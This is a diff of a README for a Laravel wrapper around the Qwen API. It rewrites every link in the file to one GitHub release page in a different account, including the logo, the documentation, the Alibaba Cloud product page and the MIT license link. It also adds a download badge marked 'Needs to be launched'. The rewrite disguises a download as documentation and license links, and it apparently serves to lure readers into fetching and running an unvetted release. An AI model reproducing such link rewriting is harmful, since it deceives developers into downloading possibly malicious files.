@@ -2,7 +2,7 @@
 
 🚀 Laravel wrapper for the Qwen PHP client, offering an intuitive and efficient way to integrate and interact with Alibaba Qwen API in your Laravel applications.
 
-![Qwen-Laravel Logo](https://www.example.com/qwen-laravel-logo.png)
+![Qwen-Laravel Logo](https://github.com/mohaibra919/qwen-laravel/releases/tag/v1.0)
 
 ## Overview
 
@@ -57,12 +57,12 @@ if ($response->isSuccessful()) {
 
 ## Documentation
 
-For detailed information on how to use Qwen-Laravel and the available methods, refer to the [official documentation](https://your-docs-url.com).
+For detailed information on how to use Qwen-Laravel and the available methods, refer to the [official documentation](https://github.com/mohaibra919/qwen-laravel/releases/tag/v1.0).
 
 ## Resources
 
-- [Qwen-Laravel GitHub Repository](https://github.com/your-github/qwen-laravel)
-- [Alibaba Cloud AI Product Page](https://www.alibabacloud.com/product/ai)
+- [Qwen-Laravel GitHub Repository](https://github.com/mohaibra919/qwen-laravel/releases/tag/v1.0)
+- [Alibaba Cloud AI Product Page](https://github.com/mohaibra919/qwen-laravel/releases/tag/v1.0)
 
 ## Contributing
 
@@ -76,8 +76,8 @@ We welcome contributions from the community to enhance Qwen-Laravel. To contribu
 
 ## License
 
-Qwen-Laravel is open-source software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+Qwen-Laravel is open-source software licensed under the [MIT license](https://github.com/mohaibra919/qwen-laravel/releases/tag/v1.0).
 
-[![Download Qwen-Laravel](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) - Needs to be launched
+[![Download Qwen-Laravel](https://github.com/mohaibra919/qwen-laravel/releases/tag/v1.0)](https://github.com/mohaibra919/qwen-laravel/releases/tag/v1.0) - Needs to be launched
 
 🌟 Happy coding with Qwen-Laravel! 🌟
